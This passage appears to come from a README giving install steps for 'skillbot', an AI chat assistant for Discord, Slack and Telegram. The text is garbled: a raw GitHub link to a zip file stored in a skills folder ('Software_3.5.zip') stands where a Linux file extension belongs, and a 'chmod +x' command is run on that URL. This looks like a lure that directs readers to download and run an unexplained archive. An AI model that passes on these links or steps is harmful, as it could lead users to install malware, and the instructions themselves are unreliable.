Once the page opens, look for the most recent release—usually at the top of the page. Each release contains the files you need to install skillbot.

### Step 2: Choose the right file for your system

On the release page, you will see different files with extensions like `.exe` for Windows, `.dmg` or `.zip` for macOS, and `.AppImage` or `https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip` for Linux.

- If you use Windows, download the `.exe` file.
- On macOS, choose the `.dmg` or `.zip` file.
- For Linux, use the `.AppImage` or `https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip` file.

The file size is usually between 10 MB and 50 MB. Downloading should only take a few minutes depending on your internet speed.

### Step 3: Install skillbot

Once your download finishes, open the file:

- **Windows:** Double-click the `.exe` file and follow the on-screen prompts.
- **macOS:** Open the `.dmg` file, drag the skillbot app to your Applications folder.
- **Linux:** Make the file executable with the command `chmod +x https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip` and run it by double-clicking or via the terminal.

The installer will guide you through the process. You don’t need to change any default options. Just click “Next” or “Continue” as you go.

## 🔧 How skillbot works

skillbot runs multiple AI tools behind the scenes, including ChatGPT and Claude, to understand what you ask and respond with helpful actions or answers.

It organizes skills as individual Markdown files. This helps keep each feature separate and easy to customize. You can add new skills or modify existing ones if you feel adventurous, but it works well right out of the box.

skillbot can connect to popular chat platforms like Discord, Slack, and Telegram. This means you can chat with your AI assistant right where you send messages every day.
